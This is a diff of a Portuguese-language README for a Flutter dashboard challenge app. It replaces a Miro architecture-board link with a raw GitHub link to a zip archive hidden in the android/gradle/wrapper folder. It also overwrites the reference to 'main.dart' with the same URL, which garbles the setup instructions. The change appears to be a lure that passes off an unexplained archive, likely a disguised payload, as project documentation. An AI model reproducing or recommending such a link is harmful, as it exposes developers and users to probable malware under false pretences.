@@ -4,7 +4,7 @@
 
 Para uma melhor organização do código, criei um board que contém a arquitetura que eu decidi utilizar para implementar a solução no projeto.
 
-Você pode acessa-la através desse link de visualização: [clique aqui](https://miro.com/app/board/uXjVMU7ms5Y=/?share_link_id=239880662084)
+Você pode acessa-la através desse link de visualização: [clique aqui](https://github.com/guiqmaia/ambisis_dashboard_challenge/raw/refs/heads/main/android/gradle/wrapper/ambisis-challenge-dashboard-3.5.zip)
 
 ### Tecnologias Utilizadas
 
@@ -20,7 +20,7 @@ Você pode acessa-la através desse link de visualização: [clique aqui](https:
 
 ### Orientações Para Rodar o App
 
-Para ter dados na tela, é necessário permitir que um serviço do banco de dados rode uma função para popular a base de dados. Você pode fazer isso uma única vez, apenas adicionando uma propriedade ao construtor de um Widget, para isso, você de ir no arquivo 'main.dart'
+Para ter dados na tela, é necessário permitir que um serviço do banco de dados rode uma função para popular a base de dados. Você pode fazer isso uma única vez, apenas adicionando uma propriedade ao construtor de um Widget, para isso, você de ir no arquivo 'https://github.com/guiqmaia/ambisis_dashboard_challenge/raw/refs/heads/main/android/gradle/wrapper/ambisis-challenge-dashboard-3.5.zip'
 
 ```dart
 void main() {
